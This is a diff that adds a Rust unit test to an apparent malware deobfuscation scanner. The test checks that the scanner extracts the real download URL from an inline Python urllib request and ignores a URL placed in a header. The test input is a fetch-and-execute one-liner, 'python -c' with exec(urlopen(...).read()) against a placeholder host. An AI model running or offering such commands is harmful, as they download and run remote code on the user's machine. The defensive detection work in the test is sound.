@@ -15831,6 +15831,37 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn python_urllib_inline_request_object_keyword_url_ignores_header_literals() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import urllib.request; exec(urllib.request.urlopen(urllib.request.Request(headers={'Referer': 'https://py.example/inline-request-referer'}, url='https://py.example/inline-request-actual')).read())""#,
+            &mut env,
+        );
+        let has_actual = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/inline-request-actual" && dst.is_none()
+            )
+        });
+        assert!(
+            has_actual,
+            "no structured Download from inline Python urllib Request object keyword URL: {:?}",
+            env.traits
+        );
+        let promoted_referer = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://py.example/inline-request-referer"
+            )
+        });
+        assert!(
+            !promoted_referer,
+            "inline Python urllib Request object header URL was promoted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_urllib_urlretrieve_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
